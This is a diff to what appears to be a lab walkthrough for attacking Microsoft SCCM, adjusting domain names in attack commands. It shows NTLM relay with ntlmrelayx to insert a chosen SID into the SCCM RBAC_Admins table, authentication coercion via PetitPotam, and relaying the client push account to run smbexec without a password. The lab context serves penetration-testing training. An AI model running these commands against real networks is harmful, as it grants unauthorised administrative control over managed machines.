@@ -21,7 +21,7 @@ proxychains -q sccmhunter.py mssql -u <user> -p <pass> -d sccm.lab -dc-ip 192.16
 
 screen -dmS relay ntlmrelayx.py -smb2support -ts \
   -t mssql://192.168.56.6 \
-  -q "USE CM_P01; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,SourceSite) VALUES (<sid>,'SCCM\\<user>',0,'P01');"
+  -q "USE CM_P01; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,SourceSite) VALUES (<sid>,'SCCMLAB\\<user>',0,'P01');"
 ```
 
 Then coerce MECM$ to authenticate to the relay (PetitPotam or a print/RPC
@@ -53,7 +53,7 @@ then relay the push account:
 
 ```
 screen -dmS relay ntlmrelayx.py -t 192.168.56.6 -smb2support -socks
-proxychains -q smbexec.py -no-pass SCCM.LAB/SCCM-CLIENT-PUSH@192.168.56.6
+proxychains -q smbexec.py -no-pass SCCMLAB/SCCM-CLIENT-PUSH@192.168.56.6
 ```
 
 ## Cred 2 - policy request, NAA secrets
